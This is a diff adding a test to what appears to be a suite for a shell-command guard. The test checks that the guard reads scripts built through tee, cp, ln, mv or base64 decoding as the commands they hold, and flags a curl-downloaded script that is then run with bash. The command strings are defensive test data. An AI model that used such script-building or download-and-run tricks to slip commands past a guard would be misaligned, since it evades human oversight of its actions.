@@ -61,6 +61,28 @@ test('a runner hands the command it runs to the guards, one test per runner', ()
   expect(argv('podman ps')).toEqual(['podman ps'])
 })
 
+test('a script the command makes by tee, cp, ln or base64 -d is read as the body it will hold', () => {
+  for (const [c, files] of [
+    ["tee /s/t.sh <<< 'pkill node' >/dev/null; bash /s/t.sh", {}],
+    ["printf 'pkill node\\n' > /s/a.sh; cp /s/a.sh /s/b.sh; bash /s/b.sh", {}],
+    ['cp /s/e.sh /s/c.sh; bash /s/c.sh', { '/s/e.sh': 'pkill node' }],
+    ['ln -sf /s/e.sh /s/l.sh; bash /s/l.sh', { '/s/e.sh': 'pkill node' }],
+    ['cp /s/e.sh /s/c.sh; mv /s/c.sh /s/d.sh; bash /s/d.sh', { '/s/e.sh': 'pkill node' }],
+    ['base64 -d <<< cGtpbGwgbm9kZQo= > /s/b.sh; bash /s/b.sh', {}],
+  ] as const) {
+    expect([c, withFiles(c, files)]).toEqual([c, expect.arrayContaining(['pkill node'])])
+  }
+  const unknown = (c: string) => {
+    const script = scriptOf(c, parse, undefined, { files: new Map(), cwd: '/s' }) as Script
+    commandsOf(script, { cwd: '/s', home: '/h' })
+    return [...(script.unknown ?? [])]
+  }
+  expect(unknown('curl http://x > /s/u.sh; bash /s/u.sh')).toEqual(['/s/u.sh'])
+  expect(unknown('cp "$X" /s/u.sh; bash /s/u.sh')).toEqual(['/s/u.sh'])
+  expect(unknown('base64 -d /s/in > /s/u.sh; bash /s/u.sh')).toEqual(['/s/u.sh'])
+  expect(unknown("printf 'ls\\n' > /s/k.sh; bash /s/k.sh")).toEqual([])
+})
+
 test('a bash -c script is read as the calls it runs', () => {
   expect(argv("bash -c 'ls /a; cat b'")).toContain('cat b')
 })
